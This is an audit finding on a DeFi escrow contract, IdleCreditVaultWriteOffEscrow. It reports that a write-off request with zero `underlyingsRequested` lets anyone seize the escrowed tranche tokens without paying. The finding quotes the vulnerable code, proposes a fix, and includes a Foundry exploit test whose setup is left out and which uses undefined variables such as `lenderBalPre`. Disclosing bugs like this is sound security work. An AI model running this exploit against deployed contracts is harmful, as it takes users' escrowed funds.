### Title
Write-off request with zero `underlyingsRequested` lets any fulfiller seize escrowed tranche tokens for free - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` validates that the escrowed tranche-token amount is nonzero, but performs no check on `underlyingsRequested`, the payment the lender expects in exchange. A request stored with `underlyings == 0` can be fulfilled by anyone paying nothing, because `fullfillWriteOffRequest` only requires `_underlyings >= currentRequest.underlyings`. This is the direct analog of the Linea `submitData` issue: a submission path that persists an "empty" payload (zero payment demand) the system later treats as valid, producing an unintended outcome.

### Finding Description
`createWriteOffRequest` reverts on `amount == 0` but happily accepts `underlyingsRequested == 0`:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:86-101
function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    if (amount == 0) revert NotAllowed();          // tranche side validated
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested  // may stay 0
    });
    pendingUnderlyings += underlyingsRequested;
}
```

`fullfillWriteOffRequest` is callable by any wallet and only enforces a lower bound on the payment:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol:123-151
if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
    revert WrongRequest();
}
...
underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings); // 0
underlyingToken.safeTransfer(_user, _underlyings - _totFee);                // 0
IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);                // all escrowed tranches
```

With `underlyings == 0`, a fulfiller passes `_underlyings = 0`, transfers nothing, and receives the full escrowed tranche balance. Additionally, an existing well-formed request `{tranches: T, underlyings: U}` can be silently degraded only by the lender, but a single accidental zero-demand request is enough: it is capturable atomically by any MEV searcher/keeper watching the escrow, with no way for the lender to react (`deleteWriteOffRequest` cannot be mined before the fulfill in the same block).

### Impact Explanation
Permanent theft of escrowed tranche tokens. A KYC'd lender who submits a write-off request with `underlyingsRequested = 0` (empty payment field, exactly the reported bug class) loses the entire escrowed `tranches` amount to an unprivileged fulfiller who pays 0 underlying. Loss equals the full notional of the escrowed tranche tokens. The same gap also means the "nonzero" intent expressed by the `amount == 0` check is only enforced on one side of the swap.

### Likelihood Explanation
Requires a lender to create a request with a zero (or dust) payment demand — a plausible UI/integration error path rather than deliberate choice, which is precisely why input validation exists (the contract already rejects `amount == 0`). Once created, fulfillment requires only an unprivileged `fullfillWriteOffRequest` call during a running epoch; no privileged role, timing dependence, or economic prerequisites are needed. Likelihood is gated by the user-error precondition, hence medium-low likelihood but high (total) impact per occurrence.

### Recommendation
Add a nonzero check on the payment side, mirroring the existing tranche check:

```solidity
// contracts/IdleCreditVaultWriteOffEscrow.sol, in createWriteOffRequest
if (amount == 0 || underlyingsRequested == 0) revert NotAllowed();
```

Consider also enforcing `underlyingsRequested > 0` cumulatively if zero-additions should be disallowed.

### Proof of Concept
Foundry fork test (setup pattern follows `test/foundry/IdleCDOEpochQueue.t.sol`: deploy `IdleCDOEpochVariant` + `IdleCreditVault` on a mainnet fork, whitelist lender via Keyring, deposit to mint tranche tokens, start an epoch so `isEpochRunning()` is true):

```solidity
function testFreeSeizureOfEscrowedTranches() external {
    // --- setup: running epoch, LENDER holds tranche tokens ---
    vm.prank(LENDER);
    tranche.approve(address(escrow), type(uint256).max);

    uint256 trancheAmt = 100e18; // lender escrows 100 tranche tokens
    // BUG: lender (or a buggy integration) submits a request with empty payment demand
    vm.prank(LENDER);
    escrow.createWriteOffRequest(trancheAmt, 0); // underlyingsRequested = 0, accepted

    // --- attack: any EOA fulfills paying nothing ---
    address fulfiller = makeAddr("fulfiller");
    vm.prank(fulfiller);
    escrow.fullfillWriteOffRequest(LENDER, trancheAmt, 0); // _underlyings = 0 passes check

    // fulfiller got all tranche tokens for 0 underlying
    assertEq(tranche.balanceOf(fulfiller), trancheAmt, "tranches not seized");
    assertEq(underlying.balanceOf(LENDER), lenderBalPre, "lender was paid"); // unchanged
}
```

Expected: the fulfill succeeds and `fulfiller` receives `trancheAmt` tranche tokens while transferring zero underlying, confirming the missing `underlyingsRequested == 0` validation.
